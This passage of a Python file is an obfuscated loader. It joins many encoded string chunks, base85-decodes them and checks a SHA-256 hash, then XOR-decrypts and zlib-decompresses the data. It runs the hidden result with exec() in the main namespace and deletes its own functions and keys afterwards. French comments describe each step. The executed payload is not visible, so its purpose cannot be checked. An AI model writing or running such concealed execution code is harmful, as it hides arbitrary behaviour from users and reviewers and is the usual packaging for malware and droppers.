_c_qmvblupqIQr2 = 'GOZS|0X?1>%gz498;k$psnSeI{+?*Y@W%n4k6vlUb>SP{MNx@F6W{Amt!ys=3?}A|'
_cbA3pnj9bGDnMT = '0XvbMcA{561e~WJx0FZzROWr}y#-o2j*4Y@=+tNdnuy5(WBQ7bBJ;IZL0FL@Qxs|q'
_clG05_sPdenamc = '8|zY2D_0T*$mJD;_<(OFp+NBJt`H8>VqB|`Y2r73r<V8~P|ukAJ4y0NQ`b1aUHTl%'
_cvscDfRrDNrkNi = 'ySNUW*Im$wg#*7_S%}F*6sM^=pNtpm<tTvxLE#sj;*<j<;C~h!v#TRghgo=jq}L5k'
_cns2KP30rnoExa = 'HhFb&%kXXp!PH6^*fJ9#B2u_IJc9h1N6~{sla^5&^=6rFsK^&)KjW^m%`hN?)Uqnh'
_cyvkkR4WjuIV_4 = 'jV0gyw709_yWnFB#|otFg%X1B=4keqyibMEPyam0i32MJr<4gHcVA^uxPC~`@({R}'
_cjFVmmUiu0OopZ = 'fmP~Q1u6'

_pfCb_RBR9IW3c5 = __import__('base64').b85decode(_cn7nTaBAQ72jDe + _c_gz9L2vYyBlNC + _cwKxTKtoMhrrtf + _cu1epqWXPqRLvg + _czs8GHekcFIlHf + _csSmjCqvUDwA9X + _ct2lVI6e1UeTAC + _cvRPkvVQ5gfZLc + _cgxvgmAqNxLeMD + _cufyqhE6NyJ0nE + _ckQ4eAiEv0Gd28 + _cxAKVrsp5MNQ1U + _cx3hmH4xBtGyY3 + _cmqXyLNxMPDSwq + _cwIOPjmvxokuak + _crED9yDdFBwHVt + _ckJyC2qIvnt_RG + _cw0XX5pTOpESyg + _caYAKjlgT_whlB + _cgWKAe5ACjx54u + _cf4aPuT73kRQlA + _ceoz6UttFCBy7H + _cmlJ4vemsjaXfj + _cpBK1_mrd2FSZi + _cqVtex_MrCJCmv + _cfzZblUUwMlYCL + _cxsNBVJbKVymHT + _casBEBE1uBgJJX + _coSsu9zd1oIjoL + _cxoMZssVibpgJA + _cysiV0c8FoMRbG + _cpdHwQWFOD4Vwz + _cuS0b9TbrnqYuW + _cnFuMbOOwNYALt + _c_gGExDoW8onQS + _cyfvxWL_VEq2Xc + _crY7tAMmZNxsd9 + _cnHLyBcuhxmrr9 + _clxnyuDrbtoZ01 + _cmLojjnsVpTDDH + _cg8PnFChbuqQFM + _cqDo_bFK7969KX + _ct853aWlyTraGh + _cqp2T2OSWRIHzl + _cu4DjOrkJsgXVn + _cxL2RBk4f4IuRH + _chGgD3Zl46cYnx + _cyEl8jrOpSjH_0 + _cqadV0zmUHrw3i + _coJQGXevMpFBci + _cscz8sy9IcmIww + _cmdV31z4yPb9oM + _ctOH5U5DjVdpiY + _cmgQ_1g5iY5Xmn + _czqpkfLSnRUjpZ + _ct35aN1haR5XJQ + _cycGc9VXnORb5W + _czJx0nrRh8NFlz + _cs7jb0SXqaAowm + _chVjO_GGy8TQCX + _cuHmig0Wqrf76K + _cdNYl0Si3PNFE5 + _cx8JRxnmPPoPRm + _ciahdsQ5IRXUu3 + _corKdWQJS7QchR + _cj8aFPN6lt8zVt + _coL9nJCy99f6bs + _cbTBD8vVUojUl0 + _chf_j23UJYiXLA + _cftGowk9uGPihq + _cluBqUEqoPLf8f + _cg7zSBzVg72IqZ + _ch1WCSIaTcM23Z + _caTvKk6A9XNctW + _cbmRkxohMuG2We + _cs0mGOI4ArNdaK + _ctrSs44VetZLEi + _clHGHR9ZSZWs1M + _clANmSbg_LU9ey + _co3dm0MVvfY4OC + _cm1f6h3wyz21a0 + _cjCMcgQZN7GYve + _cc1D_vCTSkEBJW + _crPDY_y3jfSGyN + _cxirQooUNHlyqB + _cg59uqa71i8g2i + _cxicjsf_L_OYzH + _ch1bA0s7ZIgrR8 + _celluVb8x6b4iy + _cqzlrskQj2ggPr + _cxvgZNkB2CLnAF + _crjgwNzL_8qSbN + _czdUL7jxYsHpPZ + _chvFUzE1WvoeiF + _cjXZHMy16oSpuS + _cah8llxV_9Ae_e + _ca6pwuGdzf9OKZ + _cxTL9PvHyLwC3e + _cbfbbIrNezHQhf + _cnL5wEZUpvKfe_ + _citMGxif8yxmDG + _cpNZNMilY21Tw7 + _ck_resPsT7xPgR + _caqTVph4eUzv2x + _chU4QCeCij5BMW + _cmHvOROgdIu7s4 + _cpINHFsqWbEHC8 + _crZdKnDGQxjZa4 + _cyfzAT9NEgYjAt + _caXcGwz_bo7b24 + _cisykArqmRNRoa + _ciVpUQWVZHYkyB + _cqQsdpOlIQWLAs + _cydYtlaZMuXsj1 + _cyDWnZAiC2h8J6 + _cvLJPj2HilLpaU + _celRf__9416MTB + _cl9pr3uXIC4Lhi + _cfNk1TL5jPeObq + _c_6kJhEbqAhzJJ + _ckAkQRS4K5R2Dr + _cjuHU2AcHeIEKo + _clsLVqB3RtiSuA + _ceV7tFZLvbYrDY + _clX3o7b2cLikCG + _cqWdmWhjL6o4GU + _csGYe4uLVtRTjB + _chclhP2UNTBPqn + _cihGjaPUcqJuL3 + _cxpwPBPMXL1Z6E + _cihI59okolpnyp + _cp4z5vTuvjOtn0 + _cewGed1XzMOL0S + _cvVZqzPMB8sW4m + _cxjO9pe_U8vBvB + _chTlKq3SlufUCQ + _czRbzUz7WpUTmO + _co9UFTmpp_SOp6 + _ciHVPrMAbo5bOx + _cylO1pIEyka1h0 + _cwgKFBWCkvPsyr + _cdxdWYk_CAtQuA + _clxg1pRyTMdCdP + _czUrxfFEIxnET0 + _cpydsQHUT3Q761 + _cz2Wg5jzB2nZMS + _cpW_SDqfBNyZJE + _cyPr47ZLdeh6JF + _cejnwAg13N0py3 + _ckN8zCGdC1k8qm + _crD3Kw9rhON7Wb + _celFeyxHrs2Rmj + _cjUtULAH_CmCH5 + _cohtetfbogDFzm + _cwmMjTcauU9jAE + _cdjpn4Mf3Oo1gd + _colfJT8qbZvy7o + _cgamF7UqTf1YYM + _c_WIBsZKPNQnkD + _caeJDmcNUnV6fy + _ckwE9yhDDnPMfp + _cospq5Jz0aGg3E + _cbFucSO_vRH2L6 + _cdQiAVybceTf1n + _czY0Fz0KXOQB9k + _ctanaSaarxgMWg + _cq6PWQP2RFB0vM + _coxGv9DKK9Nv0s + _cxsP2mVkMQuWbP + _ccvs_xd7jsKCVE + _ciowPTXZYrVgt1 + _cvUU0Fx8fXYJ4N + _c_qmvblupqIQr2 + _cbA3pnj9bGDnMT + _clG05_sPdenamc + _cvscDfRrDNrkNi + _cns2KP30rnoExa + _cyvkkR4WjuIV_4 + _cjFVmmUiu0OopZ)
if __import__('hashlib').sha256(_pfCb_RBR9IW3c5).hexdigest() != '8b26ee53170302c8e542b6c0c1c97f36fd859ee8cb840973ae21a7c7b1f2fbf4':
    __import__('sys').exit(1)
_xaovUn5tODRLDN = bytes([126, 90, 109, 1, 202, 94, 116, 246, 52, 226, 88, 247, 42, 165, 223, 14, 94, 173, 85, 245, 136, 127, 11, 209, 5, 48])
_fklq0apGqVn_EsG = bytes([100, 217, 93, 223, 189, 174, 240, 123, 152, 236, 119, 203, 230, 139, 6, 173, 36, 165, 106, 0, 88, 183, 113, 187, 41, 164])

def _fxbzMQBnqgEkLKE(_bkJs84YB28W1Tc, _kqoSgB57xVcv7L):
    return bytes(_bkJs84YB28W1Tc[_iaR1k9vI9O3iw6] ^ _kqoSgB57xVcv7L[_iaR1k9vI9O3iw6 % len(_kqoSgB57xVcv7L)] for _iaR1k9vI9O3iw6 in range(len(_bkJs84YB28W1Tc)))

def _fdbc9IoA28AqMVO(_tzbkp4HuZfFBAO):
    import zlib
    return zlib.decompress(_tzbkp4HuZfFBAO) # Un seul niveau de zlib ici pour simplifier

def _fetoRKgtoBESZ1X():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xcVQO4h43bhnud = _fxbzMQBnqgEkLKE(_pfCb_RBR9IW3c5, _xaovUn5tODRLDN)
    # 2. Décompression Zlib
    _d_BmMF7QfJrDH5 = _fdbc9IoA28AqMVO(_xcVQO4h43bhnud)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _d_BmMF7QfJrDH5.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ni7I7UouZRkalo = _main.__dict__
    _ni7I7UouZRkalo.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ni7I7UouZRkalo)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fetoRKgtoBESZ1X()
try:
    del _fxbzMQBnqgEkLKE, _fdbc9IoA28AqMVO, _fetoRKgtoBESZ1X
    del _pfCb_RBR9IW3c5, _xaovUn5tODRLDN, _fklq0apGqVn_EsG
except:
    pass
